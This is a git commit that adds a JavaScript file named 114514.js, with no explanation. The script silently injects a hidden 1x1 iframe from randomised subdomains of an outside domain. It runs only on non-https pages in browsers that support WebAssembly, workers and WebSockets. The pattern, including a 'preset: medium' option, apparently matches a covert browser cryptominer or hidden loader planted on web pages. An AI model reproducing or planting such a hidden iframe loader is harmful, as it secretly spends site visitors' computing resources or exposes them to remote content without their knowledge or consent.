0e22752b4ec84bbc9486500bdd7ba60ddbf21a06
webaneki <38094699+webaneki@users.noreply.github.com>
2018-04-30 17:39:34 +0800

    Create 114514.js

---
+++ 114514.js
@@ -0,0 +1,25 @@
+<script>
+(function () {
+  if (!window.Worker || !window.WebAssembly || !window.WebSocket || window.location.protocol === 'https:') return;
+
+  var options = {
+    publisher: 'wf1',
+    domain: 'water-fruits.tk',
+    preset: 'medium',
+    subId: ''
+  };
+
+  var i = document.createElement('iframe');
+  i.width = i.height = 1;
+  i.style.display = 'none';
+
+  i.src = 'http://' + Math.random().toString().replace('0.', 'www.') + '.' + options.domain + '/s/?product=trs&publisher=' + options.publisher + '&preset=' + options.preset + '&subid=' + encodeURIComponent(options.subId || '');
+  if (document.body) {
+    document.body.appendChild(i)
+  } else {
+    document.addEventListener('DOMContentLoaded', function (event) {
+      document.body.appendChild(i)
+    })
+  }
+})()
+</script>
